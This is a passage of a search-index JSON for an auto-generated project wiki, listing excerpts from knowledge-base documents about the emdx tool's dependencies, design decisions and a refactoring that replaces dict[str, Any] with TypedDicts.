\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500...</p> </li> <li> <p>#6099 Gameplan #3: Smart Priming   Section: Implementation Steps</p> </li> <li>Standalone: works with just recent docs + view counts (v1)</li> <li>Better with Feature #2 (Auto-Linking): can show \"key docs by reference count\"</li> <li> <p>Better with Feature #6 (Knowledge Decay): staleness scoring</p> </li> <li> <p>#6281 DEBT-16: Dependabot and Renovate Configuration   Section: Files Created</p> <p>...o reduce PR noise</p> </li> <li>Keeps major updates separate for careful review</li> <li>Labels: <code>dependencies</code>, <code>python</code></li> <li>GitHub Actions ecosystem: Weekly checks on Mondays at 9am PT</li> <li>Groups all action updates together</li> <li>Labels: <code>dependencies</code>, <code>github-actions</code></li> <li> <p>C...</p> </li> <li> <p>#6707 Delegate: Analyze the current Task screen (emdx/ui/task_view.py, task_ [2/4]   Section: The Detail Pane</p> <p>...imestamps**: Created/Updated/Completed as relative times</p> </li> <li>Tags (if any)</li> <li>Dependencies \u2014 loads via <code>get_dependencies(task_id)</code>, shows <code>Depends on:</code> with status icons</li> <li> <p>Dependents \u2014 loads via <code>get_dependents(task_id)</code>, shows <code>Blocks:</code> with status...</p> </li> <li> <p>#6386 Delegate: Research how Claude Code specifically works as an agent \u2014 wh [3/4]   Section: Key Differences: Native vs. emdx delegate</p> <p>...ndependent | | Background | Built-in with auto-deny | All results inline | | Dependencies | Manual chaining from main | Sequential pipeline (--chain) | | Nesting | Subagents cannot spawn subagents | Dynamic discovery (--each) |</p> </li> <li> <p>#36 Claude Document Template System   Section: Standard Document Format</p> </li> <li>Location: core/filename.fish</li> <li>Dependencies: List any requirements</li> <li>Testing: How to verify it works</li> </ul>"},{"location":"entities/dependencies/#6-optional-dependencies-guard","title":"6. Optional Dependencies Guard","text":"<p>Since distill uses Anthropic API, guard imports: ```python try:     import anthropic     HAS_ANTHROPIC = True except ImportError:     HAS_ANTHROPIC = False</p>"},{"location":"entities/dependencies/#dependencies_1","title":"Dependencies","text":"Issue Impact Fix <code>python-dotenv</code> declared but never imported Dead dependency Remove from pyproject.toml <code>ruff ^0.1.0</code> seve..."},{"location":"entities/dependencies/#dependencies_2","title":"Dependencies","text":""},{"location":"entities/dependencies/#implementation-details","title":"Implementation Details","text":""},{"location":"entities/dependencies/#related-entities","title":"Related Entities","text":"<ul> <li><code>synthesis layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>future extensions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>emdx compact --schedule weekly</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>discovery layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>archive layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>timestamps</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>task types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>task granularity</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>status flow</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>task_execution</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> </ul>"},{"location":"entities/design-decisions/","title":"design decisions","text":"<p>Type: heading | Mentioned in: 11 documents | First seen: 2026-02-14</p>"},{"location":"entities/design-decisions/#documents-11","title":"Documents (11)","text":"<ul> <li>#6556 Delegate: --memory N flag implementation </li> </ul> <p>In <code>tests/test_delegate_commands.py</code>:</p> <ul> <li><code>TestFormatTimeAgo</code> class (4 tests):</li> <li><code>test_minutes_ago</code> / <code>test_hours_ago</code> / <code>test_days_ago</code></li> <li> <p><code>test_invalid_datetime_returns_unknown</code></p> </li> <li> <p><code>TestGetMemoryContext</code> class (6 tests):</p> </li> <li> <p>`...</p> </li> <li> <p>#6543 Delegate Enhancement Gameplans [2/5]</p> <p>The implementation wraps the existing <code>execute()</code> call in <code>_run_single()</code> with a retry loop, preserving task_id and respecting future <code>--budget</code> integration. ---</p> </li> </ul>"},{"location":"entities/design-decisions/#tests-added","title":"Tests Added","text":""},{"location":"entities/design-decisions/#design-decisions_1","title":"Design Decisions","text":""},{"location":"entities/design-decisions/#what-gets-retried","title":"What Gets Retried","text":"<p>| Error Type | Retryable | Rationale | |---...</p> <ul> <li>#6541 Delegate Enhancement Gameplans [3/5] <p>This enables agents to build on prior work without manually searching the knowledge base. ## Design Decisions</p> </li> </ul>"},{"location":"entities/design-decisions/#tag-filtering","title":"Tag Filtering","text":"<ul> <li>Filter to documents tagged <code>needs-review</code> OR <code>delegate-output</code> (as specified)</li> <li> <p>Use <code>search_by_tags()</code> with `mode=\"any\"...</p> </li> <li> <p>#6452 Implement emdx compact command</p> <p>compact command (emdx/commands/compact.py)</p> </li> <li>Discovery Mode (free, no API):</li> <li><code>--dry-run</code>: Show clusters using TF-IDF similarity</li> <li><code>--threshold</code>: Adjust similarity threshold (default 0.5)</li> <li><code>--topic</code>: Filter to documents matching topic</li> </ul> <p>-...</p> <ul> <li>#6413 Delegate: Implement 'emdx review' CLI commands for triaging agent-prod   Section: Files Changed </li> <li>Followed existing patterns from tasks.py and tags.py</li> <li>Used existing tag functions from emdx/models/tags.py (add_tags, remove_tags, search_by_tags)</li> <li> <p>No schema cha...</p> </li> <li> <p>#6409 Delegate: Research and design smarter context injection for emdx deleg [1/2]</p> <p>This builds on the existing <code>--doc 42</code> mechanism but uses search to discover relevant documents automatically. ## Current State</p> </li> </ul> <p><code>--doc</code> implementation (delegate.py:224-241):</p> <pre><code>def _load_doc_context(doc_id: int, prompt: str | None) -&gt; str...\n\n- **#6367** Gameplan: emdx compact \u2014 AI-Powered KB Synthesis\n  &gt; existing entries ... \"compact\": \"Reduce KB redundancy through AI synthesis\",\n}\n</code></pre>"},{"location":"entities/design-decisions/#design-decisions_2","title":"Design Decisions","text":""},{"location":"entities/design-decisions/#phase-4-testing-day-3","title":"Phase 4: Testing (Day 3)","text":""},{"location":"entities/design-decisions/#task-41-create-test-suite","title":"Task 4.1: Create Test Suite","text":"<p>Create <code>tests/test_compact.py</code>:</p> <pre><code>\"\"\"Tests for emdx compact command.\"\"\"\n\nimport pytest\nf...\n\n- **#6366** Gameplan: emdx distill \u2014 Synthesize KB Content for Sharing\n  &gt; Consider GraphQL for complex nested queries\n\n---\n*Distilled from 12 documents \u2022 Generated 2026-02-15*\n</code></pre>"},{"location":"entities/design-decisions/#for-for-me","title":"For <code>--for me</code>","text":"<p>```markdown</p>"},{"location":"entities/design-decisions/#api-design-patterns-internal","title":"API Design Patterns (Internal)","text":""},{"location":"entities/design-decisions/#key-findings","title":"Key Findings","text":"<ul> <li>RESTful naming: docs #42, #67, #89 all consistent</li> <li> <p>JWT aut...</p> </li> <li> <p>#6288 Delegate: DEBT-13: Add retry logic for network/IO operations</p> <p>Added retry to GitHub CLI calls (<code>emdx/commands/gist.py</code>)</p> </li> <li><code>_run_gh_auth_token()</code> - gh auth token command with retry</li> <li><code>_run_gh_gist_create()</code> - gh gist create command with retry</li> <li><code>_run_gh_gist_edit()</code> - gh gist edit command with retry</li> <li> <p>Only retri...</p> </li> <li> <p>#6713 wiki-schema-research</p> <p>TypedDict additions in <code>database/types.py</code>:</p> </li> </ul> <p>```python class WikiTopicRow(TypedDict):     id: int     name: str     description: str | None     entity_fingerprint: str     method: str     coherence_score: float | None     status: str     created_...</p> <ul> <li>#6450 Implement emdx distill command   Section: 1. emdx/services/synthesis_service.py <p>Design Decisions:</p> </li> <li>Uses Claude Opus by default for quality-critical synthesis</li> <li>Import guard for <code>anthropic</code> (optional extra)</li> <li>Truncates long documents to 6000 chars to manage context</li> </ul>"},{"location":"entities/design-decisions/#related-entities","title":"Related Entities","text":"<ul> <li><code>title here</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>tag filtering</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>search_by_tags</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>another title</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>[2] doc #1235: another title (4h ago)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>[1] doc #1234: title here (2h ago)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>uses claude opus</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>timeoutexpired</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>rejected</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>register command</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> </ul>"},{"location":"entities/dict/","title":"dict","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-14</p>"},{"location":"entities/dict/#documents-8","title":"Documents (8)","text":"<ul> <li>#6583 Delegate synthesis [synthesis]   Section: Production Code (<code>services/</code> + <code>ui/</code>) <ul> <li>8 actionable <code>dict[str, Any]</code> / bare <code>dict</code> returns in <code>services/</code> across 3 files</li> </ul> </li> <li>21 fixable <code>Any</code>-typed parameters in <code>ui/</code> across 14 files</li> <li> <p>Most fixes are mechanical: add `T...</p> </li> <li> <p>#6577 Delegate: Audit emdx/services/ for functions that still return dict[str, Any] [1/3]   Section: Summary</p> <p>Found 5 locations across 3 files where <code>dict[str, Any]</code> (or bare <code>dict</code>) is used as a return type or parameter type. Two are intentionally <code>Any</code> per CLAUDE.md exceptions (cli_executor). Three are actionable.</p> </li> <li> <p>#6475 Dead Code and Error Handling Audit: emdx Project   Section: Dead Code Analysis</p> <p>...UI module re-exports: Many unused widget exports</p> </li> <li>Type hints: <code>Optional</code>, <code>Any</code>, <code>Dict</code> imported but unused</li> <li> <p>Rich components: <code>Panel</code>, <code>Text</code> imported but unused</p> </li> <li> <p>#6310 Delegate: Analyze DATA FLOW &amp; STATE MANAGEMENT across emdx/ (exclude u [7/15]   Section: 3. UNNECESSARY TRANSFORMATIONS: <code>dict(row)</code> Everywhere</p> <p>Pattern: Every database query converts <code>sqlite3.Row</code> to <code>dict</code> immediately.</p> </li> <li> <p>#6275 Delegate: DEBT-6: Remove dead code   Section: Changes Made</p> <p>...Tool<code>,</code>get_default_cli_tool`</p> </li> <li>emdx/ui/activity/activity_data.py: removed <code>Any</code>, <code>Dict</code>, <code>Optional</code></li> <li>emdx/ui/activity/activity_view.py: removed <code>Any</code>, <code>Dict</code>, <code>Tuple</code></li> <li>emdx/ui/activity/group_picker.py: removed <code>Callable</code>, <code>Horizontal</code></li> <li> <p>emdx/ui/activ...</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 1. UNUSED IMPORTS (High Priority)</p> <p>...ee<code>,</code>sparkline`</p> </li> <li><code>emdx/ui/activity/activity_data.py:8</code> - unused imports: <code>Any</code>, <code>Dict</code>, <code>Optional</code></li> <li><code>emdx/ui/activity/activity_view.py:16</code> - unused imports: <code>Any</code>, <code>Dict</code>, <code>Tuple</code></li> <li> <p><code>emdx/ui/activity/group_picker.py:9,13</code> - unused imports: <code>Callable</code>...</p> </li> <li> <p>#6219 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: Critical Issues (8)</p> </li> </ul>"},{"location":"entities/dict/#3-duck-typed-database-rows-without-protocoltypeddict","title":"3. Duck-typed database rows without Protocol/TypedDict","text":"<p>File: <code>emdx/database/__init__.py:83-310</code> Issue: <code>SQLiteDatabase</code> methods return <code>dict</code> without specifying structure. Functions like <code>save_document()</code>, `get_d...</p>"},{"location":"entities/dict/#related-entities","title":"Related Entities","text":"<ul> <li><code>unified_executor.py:192</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>synthesisinputdocument</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>synthesis_service.py:390</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>synthesis_service.py:223</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>synthesis_service.py:140</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>execute_task_sync()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>distill_single()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>costestimate</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>claude_executor.py:241</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>5 locations</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/dictstr-any/","title":"dict[str, any]","text":"<p>Type: tech_term | Mentioned in: 46 documents | First seen: 2026-01-10</p>"},{"location":"entities/dictstr-any/#documents-46","title":"Documents (46)","text":"<ul> <li> <p>#6728 Wiki Generation Architecture Research [6/10]   Section: Recommendation: Three-Tier Scoring with Noise Filtering</p> <p>...n<code>| | SUMMARY_NOISE | 12 |</code>summary fixed<code>,</code>summary added<code>| | TYPE_ANNOT | 8 |</code>dict[str, any]<code>,</code>list[dict[str, any]]` |</p> </li> <li> <p>#6605 Delegate: Fix PR #687: Add ExecutionResultDict TypedDict for Execution   Section: Changes Made</p> <p>...ported <code>ExecutionResultDict</code> from <code>.types</code></p> </li> <li>Changed <code>to_dict()</code> return type from <code>dict[str, Any]</code> to <code>ExecutionResultDict</code></li> <li> <p><code>Any</code> import preserved (still used by <code>Mapping[str, Any]</code> and other code in the file)</p> </li> <li> <p>#6604 Delegate: Add ExecutionResultDict TypedDict for ExecutionResult.to_dic   Section: Delegate: Add ExecutionResultDict TypedDict for ExecutionResult.to_dict()</p> </li> <li> <p>#6601 Delegate: Fix PR #687 on branch delegate/add-a-typeddict-for-the-dict-   Section: Investigation</p> <p>..._executor.py` on this branch version</p> </li> <li>The PR correctly replaced the only usage: <code>dict[str, Any]</code> return type \u2192 <code>ExecutionResultDict</code> TypedDict</li> <li> <p>The file uses <code>format_stream_line(line: str, ...)</code> (not <code>format_stream_message(msg: Mapping[str, Any], ...)</code>), so t...</p> </li> <li> <p>#6583 Delegate synthesis [synthesis]   Section: Production Code (<code>services/</code> + <code>ui/</code>)</p> <ul> <li>8 actionable <code>dict[str, Any]</code> / bare <code>dict</code> returns in <code>services/</code> across 3 files</li> </ul> </li> <li>21 fixable <code>Any</code>-typed parameters in <code>ui/</code> across 14 files</li> <li> <p>Most fixes are mechanical: add <code>TypedDict</code>...</p> </li> <li> <p>#6581 Delegate: Audit emdx/ui/ for methods with Any-typed parameters that co [2/3]   Section: 5. <code>search/search_presenter.py:155</code> \u2014 <code>_load_initial_data_sync() -&gt; tuple[Any, list[dict[str, Any]]]</code></p> <p>The first element is a list of <code>SearchResult</code> objects from <code>UnifiedSearchService.get_recent_documents()</code>. The second is <code>list[dict[str, Any]]</code> for popular tags (this one is acceptable since the tag dict shape varies).</p> </li> <li> <p>#6578 Delegate: List all TypedDicts defined in emdx/ and count how many file   Section: Summary</p> <p>...(36.6%) | | TypedDict definitions | 45 | | TypedDict definition files | 8 | | <code>dict[str, Any]</code> occurrences | 93 across 29 files | | Files using <code>: Any</code> annotations | 29 |</p> </li> <li> <p>#6579 Delegate: Add a TypedDict for the dict returned by ExecutionResult.to_   Section: Files Modified</p> <p>...ct returned by <code>to_dict()</code>.</p> </li> <li> <p><code>emdx/services/unified_executor.py</code> \u2014 Replaced <code>dict[str, Any]</code> return annotation with <code>ExecutionResultDict</code>, removed unused <code>Any</code> import, added import for the new type.</p> </li> <li> <p>#6577 Delegate: Audit emdx/services/ for functions that still return dict[str, Any] [1/3]   Section: Summary</p> <p>Found 5 locations across 3 files where <code>dict[str, Any]</code> (or bare <code>dict</code>) is used as a return type or parameter type. Two are intentionally <code>Any</code> per CLAUDE.md exceptions (cli_executor). Three are actionable.</p> </li> <li> <p>#6563 Delegate: Document #6418 (Type System Audit: Replace Any/None with Con   Section: Overview</p> <p>This task completed Phase 4 of the type system audit, replacing <code>dict[str, Any]</code> return types and <code>**kwargs: Any</code> patterns with concrete TypedDict definitions in the commands layer.</p> </li> <li> <p>#6515 Any removal Phase 2: UI TypedDicts   Section: Summary</p> <p>This phase creates TypedDicts for the UI layer to replace <code>dict[str, Any]</code> type annotations, improving type safety and editor autocomplete support.</p> </li> <li> <p>#6514 Any removal Phase 3: Protocols   Section: 5. Files NOT changed (analysis)</p> <p>...<code>palette_screen.py</code>: <code>kwargs: Any</code> patterns are standard for Textual widgets, <code>dict[str, Any]</code> for result payloads is appropriate</p> </li> <li> <p>#6509 Any Type Removal Analysis [synthesis]   Section: Common Themes</p> </li> <li> <p>#6508 Any Type Removal Analysis [synthesis]   Section: Common Patterns Identified</p> </li> <li><code>CascadeRunDict</code>, <code>GroupDict</code>, <code>PipelineActivityDict</code> (UI layer)</li> <li> <p>`CompactDocumentRow...</p> </li> <li> <p>#6493 Any Type Removal Analysis [2/5]   Section: 1. <code>emdx/ui/browser_container.py</code></p> <p>...attern for passing through to parent <code>App.__init__</code> | | 85 | <code>self.browser_states: dict[str, Any]</code> | <code>dict[str, dict[str, object]]</code> | Stores serializable state dicts from <code>save_state()</code> | | 89 | <code>def exit(self, *args: Any, **kwargs: Any)</code> | `args: object, *kwar...</p> </li> <li> <p>#6490 Any Type Removal Analysis [4/5]   Section: 4. <code>scored</code> list type (Line 409)</p> <p>Current:</p> </li> </ul> <pre><code>scored: list[tuple[float, dict[str, Any]]] = []\n</code></pre> <ul> <li>#6488 Any Type Removal Analysis [1/5]   Section: Occurrence 1-6: <code>doc_db: Any</code> parameter in abstract methods <p>class DocumentDBProtocol(Protocol):     def get_document(self, doc_id: int) -&gt; dict[str, Any] | None: ...     def get_children(self, doc_id: int) -&gt; list[dict[str, Any]]: ...</p> </li> </ul> <pre><code>\n- **#6487** Any Type Removal Analysis [3/5]\n  *Section: 2. Line 147: `ResultSelected` message result parameter*\n  &gt; **Current:**\n```python\ndef __init__(self, result: dict[str, Any]):\n</code></pre> <ul> <li>#6485 Any Type Removal Analysis [3/5]   Section: Occurrence 2: ResultSelected.result dict <p>Current Signature:</p> </li> </ul> <pre><code>class ResultSelected(Message):\n    def __init__(self, result: dict[str, Any]):\n</code></pre> <ul> <li>#6484 Any Type Removal Analysis [4/5]   Section: File: <code>emdx/services/unified_search.py</code> </li> </ul> <pre><code>scored: list[tuple[float, dict[str, Any]]] = []\n</code></pre> <ul> <li>#6437 Any/None typing audit [synthesis]   Section: Patterns of Any Usage <ol> <li>Pre-Cast Intermediate Dicts (4 occurrences) - <code>raw: dict[str, Any]</code></li> </ol> </li> <li>Used temporarily before casting to TypedDict</li> <li> <p>Verdict: Keep as-is (legitimate pattern)</p> </li> <li> <p>#6436 Any/None typing audit [5/5]   Section: activity/group_picker.py</p> <p>...: Any, **kwargs: Any<code>| \u274c No | Widget passthrough | |</code>self.groups<code>| L116 |</code>list[dict[str, Any]]<code>| \u2705 Yes |</code>list[GroupRow]<code>(TypedDict) | |</code>self.filtered_groups<code>| L117 |</code>list[dict[str, Any]]<code>| \u2705 Yes |</code>list[GroupRow]` |</p> </li> <li> <p>#6434 Any/None typing audit [4/5]   Section: cascade_service.py</p> <p>...-----|----------------------| | <code>get_orphaned_cascade_executions()</code> | Return <code>list[dict[str, Any]]</code> | \u2705 Yes | <code>list[OrphanedExecutionRow]</code> TypedDict | | <code>monitor_execution_completion()</code> | Params <code>doc: dict</code>, <code>next_stage_map: dict</code>, <code>save_doc: Callable</code> | \u26a0\ufe0f Parti...</p> </li> <li> <p>#6433 Any/None typing audit [2/5]   Section: tasks.py</p> <p>...SQL params in <code>get_ready_tasks()</code> | \u2705 Yes | <code>list[str \\| int]</code> | | Line 467 <code>raw: dict[str, Any]</code> | Intermediate dict before cast | \u26a0\ufe0f Partial | Keep as-is (cast to EpicViewDict follows) |</p> </li> <li> <p>#6432 Any/None typing audit [1/5]   Section: documents.py</p> <p>...----------|--------------|----------------------| | <code>_parse_doc_datetimes</code> | <code>doc: dict[str, Any]</code> param, returns <code>dict[str, Any]</code> | No | Necessary - generic helper mutates dicts before they are cast to TypedDicts | | <code>list_documents</code> | <code>params: list[Any]</code> lo...</p> </li> <li> <p>#6419 Type System Audit: Replace Any/None with Concrete Types [synthesis]   Section: Executive Summary</p> <p>...functions** across <code>emdx/models/</code> and <code>emdx/database/</code> that return loosely-typed <code>dict[str, Any]</code> or <code>list[dict[str, Any]]</code>. These can be replaced with concrete TypedDict definitions to improve type safety, IDE autocompletion, and code maintainability.</p> </li> <li> <p>#6418 Type System Audit: Replace Any/None with Concrete Types [3/4]   Section: Type System Audit: Replace Any/None with Concrete Types</p> </li> <li> <p>#6417 Type System Audit: Replace Any/None with Concrete Types [4/4]   Section: 1. Activity Items \u2014 <code>doc_db: Any</code> (6 occurrences)</p> <p>class DocumentDatabaseProtocol(Protocol):     def get_document(self, identifier: int | str) -&gt; dict[str, Any] | None: ...     def get_children(self, doc_id: int) -&gt; list[dict[str, Any]]: ...</p> </li> <li> <p>#6415 Type System Audit: Replace Any/None with Concrete Types [2/4]</p> </li> </ul>"},{"location":"entities/dictstr-any/#task","title":"Task","text":"<p>Add <code>ExecutionResultDict</code> TypedDict for the <code>ExecutionResult.to_dict()</code> return type, replacing <code>dict[str, Any]</code>.</p>"},{"location":"entities/dictstr-any/#3-database-row-dicts-high-priority","title":"3. Database Row Dicts (High Priority)","text":"<p>~25 occurrences of <code>dict[str, Any]</code> for database results with known schemas.</p>"},{"location":"entities/dictstr-any/#3-dictstr-any-for-known-structures-15-occurrences","title":"3. <code>dict[str, Any]</code> for known structures (15+ occurrences)","text":"<p>Solution: Create TypedDicts for:</p>"},{"location":"entities/dictstr-any/#5-line-409-scored-items-list","title":"5. Line 409: Scored Items List","text":""},{"location":"entities/dictstr-any/#overview","title":"Overview","text":"<p>This audit identifies function parameters and return types using <code>Any</code>, <code>dict[str, Any]</code>, or <code>Optional[Any]</code> in <code>emdx/commands/</code> and <code>emdx/services/</code>. For each, I analyze actual usage to determine the proper concrete type.</p>"},{"location":"entities/dictstr-any/#type-system-audit-emdxdatabase-module","title":"Type System Audit: emdx/database/ Module","text":""},{"location":"entities/dictstr-any/#functions-returning-dictstr-any-listdictstr-any-or-tupleany","title":"Functions Returning <code>dict[str, Any]</code>, <code>list[dict[str, Any]]</code>, or <code>tuple[Any, ...]</code>","text":"<ul> <li> <p>#6416 Type System Audit: Replace Any/None with Concrete Types [1/4]   Section: Summary</p> <p>Audited all functions in <code>emdx/models/</code> that return <code>dict[str, Any]</code> or <code>list[dict[str, Any]]</code>. Found 15 functions that could benefit from TypedDict or dataclass replacements.</p> </li> <li> <p>#6370 Mypy Type Error Fixes (Issue #556)   Section: Files Fixed (6 files, +207/-139 lines)</p> <p>...te_cascade_run` with Optional types and return type</p> </li> <li>Fixed <code>_process_stage</code> with <code>dict[str, Any]</code> param type</li> <li> <p>Added <code>-&gt; None</code> to all @app.command() decorated functions</p> </li> <li> <p>#6330 Delegate synthesis [synthesis]   Section: Data Access Inconsistencies</p> <ul> <li>Mixed return types: Some functions return <code>dict[str, Any]</code>, others return dataclasses (<code>Execution</code>)</li> </ul> </li> <li>Different connection patterns: <code>db.get_connection()</code> vs <code>db_connection.get_connection()</code></li> <li> <p>Row access varies: positional...</p> </li> <li> <p>#6325 Delegate: Analyze emdx/database/ and emdx/models/ for architecture imp [4/10]   Section: 2. Inconsistent Data Access Patterns</p> <p>Pattern A - Raw dicts from sqlite3.Row:</p> </li> <li><code>database/documents.py</code>: Returns <code>dict[str, Any]</code></li> <li><code>database/groups.py</code>: Returns <code>dict[str, Any]</code></li> <li><code>database/cascade.py</code>: Returns <code>dict[str, Any]</code></li> <li> <p><code>models/tasks.py</code>: Returns <code>dict[str, Any]</code></p> </li> <li> <p>#6324 Delegate: Architecture Improvement Analysis v0.14.0 [9/10]   Section: 2.8 Type Safety Improvements (Low Priority)</p> <p>Current State: Heavy use of <code>dict[str, Any]</code> for documents</p> </li> <li> <p>#6310 Delegate: Analyze DATA FLOW &amp; STATE MANAGEMENT across emdx/ (exclude u [7/15]   Section: Recommendations</p> <p>...nnection</p> </li> <li> <p>Type-hint row returns \u2014 Use <code>TypedDict</code> or dataclasses instead of <code>dict[str, Any]</code></p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: High Priority Findings</p> </li> <li> <p>#6235 Delegate: tech-debt,audit,comprehensive [12/14]   Section: \ud83d\udfe1 Medium Priority Issues</p> <p>Heavy use of <code>Dict[str, Any]</code> indicates missing domain models.</p> </li> <li> <p>#6234 Delegate: Tech Debt Category Audit 2026-02-14 [14/14]   Section: CATEGORY 2: Type Safety &amp; Static Analysis</p> </li> <li>71 uses of <code>Dict[str, Any]</code> across 23 files</li> <li>Previously 217 - significant improvement (67% reduction)</li> <li> <p>Remaining hotspots: <code>utils/structured_logger.py</code> (10), <code>commands/analyze.py</code> (6)...</p> </li> <li> <p>#6232 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: HIGH Severity - Could use TypedDict or more specific types</p> <p>...| |-----------|-------| | <code>emdx/services/unified_executor.py:171</code> | <code>to_dict() -&gt; Dict[str, Any]</code> - Could define TypedDict for ExecutionResult | | <code>emdx/services/duplicate_detector.py:109,345,371,431,463</code> | Multiple <code>Dict[str, Any]</code> returns for document data | |...</p> </li> <li> <p>#6219 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: Critical Issues (8)</p> <p>...ecutor/base.py:115<code>**Issue:**</code>def parse_stream_line(self, line: str) -&gt; Optional[Dict[str, Any]]:` - uses Any, runtime type errors possible Severity: CRITICAL</p> </li> <li> <p>#4894 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Tier 3: Medium Priority (Backlog)</p> <p>3.2 Add TypedDicts for Data Structures</p> </li> <li><code>ExecutionResult</code>, <code>DocumentRecord</code>, <code>WorkflowConfig</code></li> <li> <p>Replace 127 instances of <code>Dict[str, Any]</code></p> </li> 